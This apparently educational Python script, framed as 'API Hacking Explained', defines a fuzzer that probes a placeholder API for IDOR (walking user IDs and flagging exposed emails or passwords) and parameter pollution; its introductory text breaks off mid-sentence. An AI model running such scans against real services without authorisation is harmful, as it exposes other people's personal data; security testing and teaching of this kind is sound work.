#!/usr/bin/env python3
"""
API Hacking Explained
=====================
Hackers don't always break in through the front door. They exploit APIs you didn't even know were exposed. Here's how: First, they scan for endpoints using tools like dirb or custom scripts. Then they

⚠️  EDUCATIONAL PURPOSES ONLY — Get proper authorization before testing.
📺  Watch the video walkthrough on our Instagram!
📅  2026-02-28 16:33:26
"""

import requests
import json
import sys
from concurrent.futures import ThreadPoolExecutor

class APIEndpointFuzzer:
    """Fuzzes API endpoints for common vulnerabilities"""
    
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_idor(self, endpoint, user_id=100):
        """Test for Insecure Direct Object Reference"""
        test_ids = [user_id, user_id+1, user_id-1, 0, 'admin']
        
        for test_id in test_ids:
            url = f"{self.base_url}/{endpoint}/{test_id}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if 'email' in data or 'password' in data:
                        self.vulnerabilities.append(f"IDOR at {url}: Exposed sensitive data")
                        return True
            except:
                continue
        return False
    
    def test_parameter_pollution(self, endpoint):
        """Test for parameter manipulation vulnerabilities"""
        url = f"{self.base_url}/{endpoint}"
        params = {
            'user_id': ['100', '101'],  # Duplicate parameter
            'admin': ['true', 'false']  # Conflicting values
        }
        
        response = self.session.get(url, params=params, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if 'admin' in str(data).lower() or 'role' in str(data).lower():
                self.vulnerabilities.append(f"Parameter pollution at {url}")
                return True
        return False
    
    def scan_endpoints(self, endpoints):
        """Scan multiple endpoints concurrently"""
        with ThreadPoolExecutor(max_workers=5) as executor:
            for endpoint in endpoints:
                executor.submit(self.test_idor, endpoint)
                executor.submit(self.test_parameter_pollution, endpoint)
        
        return self.vulnerabilities

# Example usage
if __name__ == "__main__":
    # Simulating testing a vulnerable API
    fuzzer = APIEndpointFuzzer("http://vulnerable-api.com/api")
    endpoints = ["users", "orders", "profile", "admin"]
    
    print("[*] Scanning for API vulnerabilities...")
    vulns = fuzzer.scan_endpoints(endpoints)
    
    if vulns:
        print("[!] Found vulnerabilities:")
        for vuln in vulns:
            print(f"  - {vuln}")
    else:
        print("[+] No obvious vulnerabilities found")

